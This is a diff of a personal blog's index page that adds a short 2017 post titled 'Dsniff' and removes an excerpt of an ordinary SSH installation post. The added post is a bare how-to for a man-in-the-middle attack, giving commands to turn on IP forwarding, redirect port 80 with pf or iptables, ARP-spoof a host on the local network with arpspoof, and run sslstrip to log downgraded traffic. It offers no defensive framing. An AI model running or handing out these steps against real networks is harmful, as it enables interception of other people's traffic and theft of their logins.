@@ -154,6 +154,91 @@
       <div class="body-wrap">
         
   
+    <article id="post-Dsniff" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2017/04/12/Dsniff/">Dsniff</a>
+    </h1>
+  
+
+        <a href="2017/04/12/Dsniff/" class="archive-article-date">
+  	<time datetime="2017-04-12T04:42:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-12</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="dsniff"><a href="#dsniff" class="headerlink" title="dsniff"></a>dsniff</h1><h2 id="enable-ports-forward"><a href="#enable-ports-forward" class="headerlink" title="enable ports forward"></a>enable ports forward</h2><p>on mac</p>
+<pre><code>sudo sysctl -w net.inet.ip.forwarding=1
+sudo sysctl -w net.inet.ip.fw.enable=1
+sudo sysctl -w net.inet.fw.verbose=1
+sudo sysctl -w net.inet.ip.fw.verbose=1
+</code></pre><p>on ubuntu</p>
+<pre><code>vim /etc/sysctl.conf
+</code></pre><p>change net.ipv4.ip_forward=0 to net.ipv4.ip_forward=1 </p>
+<p>enable it</p>
+<pre><code>sysctl -p
+</code></pre><p>on kali</p>
+<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+</code></pre><h2 id="port-redirect"><a href="#port-redirect" class="headerlink" title="port redirect"></a>port redirect</h2><p>on mac <a href="https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man5/pf.conf.5.html" target="_blank" rel="external">pf</a> </p>
+<pre><code>vim /etc/pf.conf
+</code></pre><p>set configuration</p>
+<pre><code>rdr pass on inet en0 proto { tcp, udp } from any to any port 80 -&gt; 127.0.0.1 port 8000
+</code></pre><p>enable it </p>
+<pre><code>pfctl -v -n -f /etc/pf.conf
+pfctl -f /etc/pf.conf
+</code></pre><p>on ubuntu <a href="https://help.ubuntu.com/community/IptablesHowTo" target="_blank" rel="external">iptables</a></p>
+<p>enable iptables</p>
+<pre><code>modprobe ip_tables
+</code></pre><p>port redirect</p>
+<pre><code>iptables -t nat -A PREROUTING -d *.*.*.* -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:8000
+</code></pre><p>check</p>
+<pre><code>iptables -t nat --list
+</code></pre><p>delete</p>
+<pre><code>iptables -t nat -D PREROUTING 1
+</code></pre><h2 id="arp-spoof"><a href="#arp-spoof" class="headerlink" title="arp spoof"></a>arp spoof</h2><p>spoof machine with ip 192.168.0.49 on mac address of 192.168.0.1 by mac address of en0</p>
+<pre><code>sudo arpspoof -i en0 -t 192.168.0.49 192.168.0.1
+</code></pre><h2 id="ssl-strip"><a href="#ssl-strip" class="headerlink" title="ssl strip"></a>ssl strip</h2><pre><code>sslstrip -a -l 8000 -w sslstrip.log
+tail -f sslstrip.log
+</code></pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Information-Security/">Information Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Useful-Tool/">Useful Tool</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="2017/04/12/Dsniff/#more">more >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-以太币解决了问题吗" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -542,65 +627,6 @@
 
 
   
-    <article id="post-Secure-Shell" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2016/12/14/Secure-Shell/">Secure Shell</a>
-    </h1>
-  
-
-        <a href="2016/12/14/Secure-Shell/" class="archive-article-date">
-  	<time datetime="2016-12-14T02:04:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-14</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="install"><a href="#install" class="headerlink" title="install"></a>install</h3><p>packages on <a href="http://mirror.centos.org/centos/7/os/x86_64/Packages/">centos 7 mirror</a><br>packages on <a href="http://mirror.centos.org/centos/6/os/x86_64/Packages/">centos 6 mirror</a></p>
-<h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><p>on ubuntu<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt -y update</div><div class="line">sudo apt install openssh-server</div></pre></td></tr></table></figure></p>
-<p>optional<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service sshd start</div></pre></td></tr></table></figure></p>
-<p>on centos<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo yum install openssh-server</div><div class="line">sudo chkconfig --list sshd</div></pre></td></tr></table></figure></p>
-<p>start service<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo systemctl sshd start</div></pre></td></tr></table></figure></p>
-<p>or<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/sshd start</div></pre></td></tr></table></figure></p>
-        <a class="article-more-a"  href="2016/12/14/Secure-Shell/#more">more >></a>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Computer-Network/">Computer Network</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Information-Security/">Information Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Useful-Tool/">Useful Tool</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="2016/12/14/Secure-Shell/#more">more >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="page/2/">2</a><a class="extend next" rel="next" href="page/2/">Next &raquo;</a>
@@ -708,7 +734,7 @@ MathJax.Hub.Queue(function() {
     
     	<section class="tools-section tools-section-tag">
     			<div class="widget tagcloud" id="js-tagcloud">
-    				<a href="tags/Computer-Network/" style="font-size: 15px;">Computer Network</a> <a href="tags/Github-Project/" style="font-size: 10px;">Github Project</a> <a href="tags/Information-Security/" style="font-size: 12.5px;">Information Security</a> <a href="tags/Note/" style="font-size: 20px;">Note</a> <a href="tags/Research-Path/" style="font-size: 10px;">Research Path</a> <a href="tags/Useful-Tool/" style="font-size: 17.5px;">Useful Tool</a>
+    				<a href="tags/Computer-Network/" style="font-size: 13.33px;">Computer Network</a> <a href="tags/Github-Project/" style="font-size: 10px;">Github Project</a> <a href="tags/Information-Security/" style="font-size: 13.33px;">Information Security</a> <a href="tags/Note/" style="font-size: 20px;">Note</a> <a href="tags/Research-Path/" style="font-size: 10px;">Research Path</a> <a href="tags/Useful-Tool/" style="font-size: 16.67px;">Useful Tool</a>
     			</div>
     	</section>
     
